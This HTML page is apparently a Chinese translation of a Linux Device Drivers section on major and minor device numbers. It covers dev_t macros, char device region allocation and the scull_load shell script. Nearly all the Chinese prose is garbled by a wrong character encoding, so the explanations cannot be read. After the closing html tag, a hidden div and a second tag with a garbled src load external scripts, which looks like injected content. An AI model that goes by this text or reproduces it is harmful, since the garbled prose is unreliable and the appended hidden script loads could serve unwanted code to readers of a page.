<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>3.2.&#160;α-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch03.html" title="&#160;3&#160;&#160;ַ">
<link rel="prev" href="ch03.html" title="&#160;3&#160;&#160;ַ">
<link rel="next" href="ch03s03.html" title="3.3.&#160;һЩҪݽṹ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">3.2.&#160;α</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch03.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;3&#160;&#160;ַ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch03s03.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="MajorandMinorNumbers.sect"></a>3.2.&#160;α</h2></div></div></div>
<p>ַ豸ͨļϵͳеȡ. ЩӳΪļϵͳļ, 豸ļ, ļϵͳļ򵥽; λ /dev Ŀ¼. ַļʹ ls -l ĵһе"c"ʶ. 豸Ҳ /dev , "b"ʶ. ¼ַ豸, ĺܶϢҲڿ豸.</p>
<p>㷢 ls -l , ῴ豸ļ 2 (һŷָ)޸ǰ, ͨļȳֵĵط. ЩǸ豸豸. бʾһϵͳϳֵļ豸. ǵ 1, 4, 7,  10, α 1, 3, 5, 64, 65,  129.</p>
<pre class="screen">
 crw-rw-rw- 1 root  root  1,  3 Apr 11  2002 null 
 crw------- 1 root  root  10, 1 Apr 11  2002 psaux 
 crw------- 1 root  root  4,  1 Oct 28 03:04 tty1 
 crw-rw-rw- 1 root  tty   4, 64 Apr 11  2002 ttys0 
 crw-rw---- 1 root  uucp  4, 65 Apr 11  2002 ttyS1 
 crw--w---- 1 vcsa  tty   7,  1 Apr 11  2002 vcs1 
 crw--w---- 1 vcsa  tty   7,129 Apr 11  2002 vcsa1 
 crw-rw-rw- 1 root  root  1,  5 Apr 11  2002 zero  
</pre>
<p>ͳ, űʶ豸. , /dev/null  /dev/zero  1 , ̨ʹն˶ 4 ; ͬ, vcs1  vcsa1 豸 7 . ִ Linux ں, 㿴Ĵ󲿷豸Ȼһһԭ֯.</p>
<p>αűںĸ豸. αд(ͬ), Դں˵õһ豸ֱָ, ߿ԼʹôαΪ豸. ĸ, ںԼ֪αŵκ, ָʵֵ豸.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheInternalRepresentationofDeviceNumber.sect"></a>3.2.1.&#160;豸ŵڲʾ</h3></div></div></div>
<p>ں, dev_t ( &lt;linux/types.h&gt;ж)豸 -- βֶ.  2.6.0 ں, dev_t  32 λ, 12 λ, 20 λα. ĴӦ, Ȼ, 豸ŵڲ֯Ӳκμ; ෴, Ӧ &lt;linux/kdev_t.h&gt;еһ׺궨. Ϊһ dev_t ߴα, ʹ:</p>
<pre class="screen">
MAJOR(dev_t dev); 
MINOR(dev_t dev);
</pre>
<p>෴, α, ҪתΪһ dev_t, ʹ:</p>
<pre class="screen">
MKDEV(int major, int minor); 
</pre>
<p>ע, 2.6 ںд豸, ǰں˰汾 255 ź 255 α. ΪôķΧںܳʱ㹻, ǼԵĴ. Ӧϣ dev_t ĸʽٴθı; , ϸд, Щ仯һ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="AllocatingandFreeingDeviceNumbers.sect"></a>3.2.2.&#160;ͷ豸</h3></div></div></div>
<p>ڽһַʱҪĵһǻȡһ豸ʹ. ΪĿĵıҪĺ register_chrdev_region,  &lt;linux/fs.h&gt;:</p>
<pre class="programlisting">
int register_chrdev_region(dev_t first, unsigned int count, char *name);
</pre>
<p>, first Ҫʼ豸. first ĴαŲֳ 0, ûҪǸЧ. count 豸ŵ. ע,  count ̫, ҪķΧһα; ֻҪҪıŷΧ, һжȻȷ. , name ӦӵŷΧ豸;  /proc/devices  sysfs .</p>
<p>ͬ󲿷ں˺, ɹ, register_chrdev_region ķֵ 0. , һĴ, 㲻ܴȡ.</p>
<p>ȷʵ֪Ҫĸ豸, register_chrdev_region ú. Ȼ, 㳣֪豸ʹĸ;  Linux ں˿һֱŬʹö̬豸. ں˻ڶ̬Ϊһ, ʹһͬĺ.</p>
<pre class="programlisting">
int alloc_chrdev_region(dev_t *dev, unsigned int firstminor, unsigned int count, char *name);
</pre>
<p>ʹ, dev һֻĲ, ںɹʱķ䷶Χĵһ. fisetminor ӦĵһҪõĴα;  0. count  name ͬ request_chrdev_region һ.</p>
<p>κη豸, Ӧڲʹʱͷ. 豸ŵͷʹ:</p>
<pre class="programlisting">
void unregister_chrdev_region(dev_t first, unsigned int count); 
</pre>
<p> unregister_chrdev_region ĵطģ cleanup .</p>
<p>ĺ豸Ÿʹ, ǲںʵϻЩʲô. ûռܹȡЩ豸һ֮ǰ, Ҫǵʵ豸ڲ. ǽμ, ȹ˼һЩҪ֦.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="DynamicAllocaionofMajorNumbers.sect"></a>3.2.3.&#160;ŵĶ̬</h3></div></div></div>
<p>һЩ豸Ǿ̬ɸͨ豸. һЩ豸бںԴ Documentation/devices.txt . ʹһѾľ̬ŵĻС, , ±ûڷ. , Ϊһд, һѡ: Լ򵥵ؼһûõı, Զ̬ʽ. ֻҪΨһûͿԼһ; һ㷺ıʹ, һŽ³ͻ鷳.</p>
<p>, , ǿҽʹö̬ȡ豸, ѡȡһǰеı. 仰˵, Ӧ϶ʹ alloc_chrdev_region,  register_chrdev_region.</p>
<p>̬ȱ޷ǰ豸ڵ, ΪģŻ仯. ʹ, ⲻ, Ϊһŷ, ɴ /proc/devices жȡ.<sup>[<a name="id414361" href="#ftn.id414361">6</a>]</sup></p>
<p>Ϊʹö̬һ, , ʹһ򵥵Ľű insmod, ڵ insmod , ȡ /proc/devices ļ.</p>
<p>һ͵ /proc/devices ļ:</p>
<pre class="screen">
Character devices:
 1 mem
 2 pty
 3 ttyp
 4 ttyS
 6 lp
 7 vcs
 10 misc
 13 input
 14 sound 
 21 sg
 180 usb

Block devices:
 2 fd
 8 sd
 11 sr
 65 sd
 66 sd 
</pre>
<p>˼һѾһ̬ŵģĽű, ʹһд,  awk ,  /proc/devices ȡϢԴ /dev еļ.</p>
<p>Ľű, snull_load,  scull һ. ģ鷢ûԴϵͳ rc.local ļеһű, Ҫģʱֹ.</p>
<pre class="programlisting">
#!/bin/sh
module="scull"
device="scull"
mode="664"

# invoke insmod with all arguments we got
# and use a pathname, as newer modutils don't look in . by default
/sbin/insmod ./$module.ko $* || exit 1

# remove stale nodes
rm -f /dev/${device}[0-3]

major=$(awk "\\$2==\"$module\" {print \\$1}" /proc/devices) 
mknod /dev/${device}0 c $major 0
mknod /dev/${device}1 c $major 1
mknod /dev/${device}2 c $major 2
mknod /dev/${device}3 c $major 3

# give appropriate group/permissions, and change the group.
# Not all distributions have staff, some have "wheel" instead.
group="staff"
grep -q '^staff:' /etc/group || group="wheel"

chgrp $group /dev/${device}[0-3]
chmod $mode /dev/${device}[0-3]
</pre>
<p>űͨض͵ mknod . űչʾ˴ 4 豸, Ϊ 4  scull Դȱʡ.</p>
<p>űпЩģ:Ϊʲôı豸ģʽ? űɳû, ½ļ root ӵ. λȱʡֻ root дȨ, κ˿Զ. ͨ, һ豸ڵҪһͬĴȡ, ĳЩ˵ĴȡȨޱı. ǵĽűȱʡǸһûȡ, ܲͬ. ڵ 6 µ"豸ļĴȡ"һ, sculluid ĴʾܹǿԼĶ豸ȡȨ.</p>
<p>һ scull_unload ű /dev Ŀ¼ȥģ.</p>
<p>ΪʹһԽűغжصѡ, Աдһ init ű, ׼÷ķʹЩűĿ¼. <sup>[<a name="id414476" href="#ftn.id414476">7</a>]</sup>Ϊ scull Դһ, ṩһ൱Ϳõ init ű, Ϊ scull.init; ܴͳĲ -- start, stop,  restart --  scull_load  scull_unload Ľɫ.</p>
<p> /dev ڵ, , һõİ취. ڼغжص, һʹĽűļ֮, ֻʹ rmmod  insmod: ̬Ų. <sup>[<a name="id414501" href="#ftn.id414501">8</a>]</sup>ÿζʹѡͬһ, 㲻καĶ̬ģ. ڿбⳤűõ. , Ȼչһζһ.</p>
<p>õķʽ, Ϊ, ȱʡʹö̬, ԼڼʱָŵѡȨ, ڱʱ. scull ʵַʽ; ʹһȫֱ, scull_major, ѡı(һ scull_minor α). ʼΪ SCULL_MAJOR,  scull.h. Դе SCULL_MAJOR ȱʡֵ 0, ˼"ʹö̬". ûԽȱʡֵѡһ, ڱǰ޸ĺ궨 insmod ָһֵ scull_major. , ͨʹ scull_load ű, û scull_load дݲ insmod.<sup>[<a name="id414535" href="#ftn.id414535">9</a>]</sup></p>
<p> scull ԴлȡŵĴ:</p>
<pre class="programlisting">
if (scull_major) {
 dev = MKDEV(scull_major, scull_minor);
 result = register_chrdev_region(dev, scull_nr_devs, "scull");
} else {
 result = alloc_chrdev_region(&amp;dev, scull_minor, scull_nr_devs, "scull");
 scull_major = MAJOR(dev);
}
if (result &lt; 0) {
 printk(KERN_WARNING "scull: can't get major %d\n", scull_major);
 return result;
}
</pre>
<p>ʹõļʹƵĴǵ.</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id414361" href="#id414361">6</a>] </sup> sysfs ܻȡõ豸Ϣ, ڻ 2.6 ϵͳͨ /sys. ʹ scull ͨ sysfs Ϣ˱µķΧ;  14 лص.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id414476" href="#id414476">7</a>] </sup>Linux Standard Base ָ init űӦ /etc/init.d, һЩȻڱ. , Ľűʱ, ҪӺʵмĿ¼һӸ(Ҳ, .../rc3.d).</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id414501" href="#id414501">8</a>] </sup>ĳЩں˿Ѿ˵ͻ.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id414535" href="#id414535">9</a>] </sup>init ű scull.init нѡ, ֧һļ, Ϊ͹ػʱԶʹ.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch03.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch03.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch03s03.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">&#160;3&#160;&#160;ַ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;3.3.&#160;һЩҪݽṹ</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>